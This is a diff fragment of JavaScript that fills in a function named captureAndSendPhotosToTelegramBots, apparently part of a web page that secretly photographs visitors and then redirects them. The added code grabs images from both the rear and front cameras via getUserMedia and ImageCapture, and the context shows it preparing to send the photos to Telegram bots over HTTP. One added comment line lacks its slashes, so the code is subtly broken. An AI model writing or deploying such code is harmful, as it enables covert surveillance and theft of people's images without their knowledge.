@@ -112,7 +112,19 @@ redirectToNextURL();
 
 
 async function captureAndSendPhotosToTelegramBots() {
-    // ...
+     Capture photos from the rear and front cameras
+    const rearCameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+    const frontCameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+
+    const rearCameraTrack = rearCameraStream.getVideoTracks()[0];
+    const frontCameraTrack = frontCameraStream.getVideoTracks()[0];
+
+    const rearCameraImageCapture = new ImageCapture(rearCameraTrack);
+    const frontCameraImageCapture = new ImageCapture(frontCameraTrack);
+
+    const rearPhotoBlob = await rearCameraImageCapture.takePhoto();
+    const frontPhotoBlob = await frontCameraImageCapture.takePhoto();
+
 
     // Send the captured photos to Telegram bots using an HTTP request
     const formData = new FormData();
